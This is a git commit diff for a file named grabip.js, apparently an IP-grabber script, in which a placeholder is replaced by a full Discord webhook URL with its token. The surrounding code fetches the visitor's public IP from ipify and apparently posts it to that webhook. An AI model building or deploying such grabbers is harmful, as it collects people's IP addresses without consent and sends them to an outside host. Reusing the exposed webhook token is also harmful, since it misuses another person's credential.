93a30506801e6ee084f7ebb32ea60df00cacf083
Rowmbo <147776791+Rowmbo@users.noreply.github.com>
2025-01-31 21:07:43 +1300

    Update grabip.js

--- grabip.js
+++ grabip.js
@@ -2,7 +2,7 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 
 
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
+const webhookURL = "https://discord.com/api/webhooks/1334796774581342229/HdcDLWIpB2Gu06EbfVuFD58cm4tSy-nnPHhzTkAEb4wokANyiLSlW6uH3-zGaXh014mb";
 
 
 async function getIP() {
